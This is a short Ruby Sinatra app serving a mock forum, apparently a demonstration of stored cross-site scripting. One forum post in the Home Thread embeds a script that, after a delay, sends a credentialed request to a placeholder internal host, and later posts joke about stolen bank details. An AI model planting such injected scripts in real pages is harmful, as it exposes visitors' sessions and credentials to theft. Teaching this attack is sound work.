require 'sinatra'

get '/' do
  '<title>The Forum</title>
<h1>The Forum</h1>
<a href="/home">Home Thread</a>'
end

get '/home' do
  '<title>Home Thread</title>
<h1>Home Thread</h1>
<br><br><br>
<h3>FIRST!!!</h3>
<a>-johnSmith</a>
<br>
<h3>So what are we supposed to talk about on here?</h3>
<a>-guest</a>
<br>
<h3>No idea....</h3>
<a>-PotterFan</a>
<br>
<h3>You are a Harry Potter fan?  Check this out!<br><img src="johnSmith-Upload.jpg" alt="user upload" width="200"
height="400"><script>
setTimeout(sendStuff, 30000)

function sendStuff(){
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "http://10.0.1.23:80/whereISend/allYourPasswordsAndStuff", true);
xhr.send();
}
</script></h3>
<a>-johnSmith</a>
<br>
<h3>Ummm, I actually meant pottery.</h3>
<a>-PotterFan</a>
<br>
<h3>Hey I think this site might have a virus.  My bank account info got stolen just after I last came here.</h3>
<a>-DannyBoy</a>
<br>
<h3>Mine too.</h3>
<a>-PotterFan</a>
<br>
<h3>The rest of the site is fine, it seems to just be this thread.</h3>
<a>-guest</a>'
end

get '/*' do
  redirect '/'
end